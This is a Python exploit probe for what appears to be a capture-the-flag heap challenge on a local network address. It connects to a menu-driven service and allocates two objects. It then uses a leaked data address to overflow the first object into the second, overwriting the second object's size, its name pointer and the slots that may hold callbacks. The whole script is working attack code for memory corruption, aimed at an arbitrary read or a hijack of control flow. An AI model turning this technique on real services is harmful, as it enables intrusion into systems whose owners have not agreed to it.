import socket
import time
import struct
import re

host = "10.2.0.5"
port = 10004


def get_response(s):
    time.sleep(0.5)
    return s.recv(4096).decode(errors="ignore")


def recv_until(s, delim):
    data = b""
    while not data.endswith(delim):
        chunk = s.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def parse_addr(out, label):
    m = re.search(f"{label}: (0x[0-9a-f]+)", out)
    if m:
        return int(m.group(1), 16)
    return None


def p64(x):
    return struct.pack("<Q", x)


def probe():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    recv_until(s, b"> ")

    # Alloc A
    s.sendall(b"1\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"A\n")
    recv_until(s, b"> ")

    # Alloc B
    s.sendall(b"2\n")
    recv_until(s, b": ")
    s.sendall(b"32\n")
    recv_until(s, b": ")
    s.sendall(b"B\n")
    recv_until(s, b"> ")

    # Leak Addresses
    s.sendall(b"6\n")
    out_a = recv_until(s, b"> ").decode(errors="ignore")
    data_a = parse_addr(out_a, "Data address")
    print(f"Data A: {hex(data_a)}")

    # Payload
    payload = b"A" * 48
    # Offset 0: Size -> 32
    payload += p64(32)
    # Offset 8: Potential Callback?
    payload += p64(0x1111111111111111)
    # Offset 16: Name Ptr -> data_a
    payload += p64(data_a)
    # Offset 24: Potential Callback?
    payload += p64(0x2222222222222222)
    # Offset 32: Potential Callback?
    payload += p64(0x3333333333333333)
    # Offset 40: Potential Callback?
    payload += p64(0x4444444444444444)

    payload += b"\n"

    # Write A
    s.sendall(b"5\n")
    recv_until(s, b": ")
    s.sendall(payload)
    recv_until(s, b"> ")

    # Show B
    s.sendall(b"7\n")
    out_b = recv_until(s, b"> ").decode(errors="ignore")
    print("Show B Output:\n", out_b)

    s.close()


if __name__ == "__main__":
    probe()
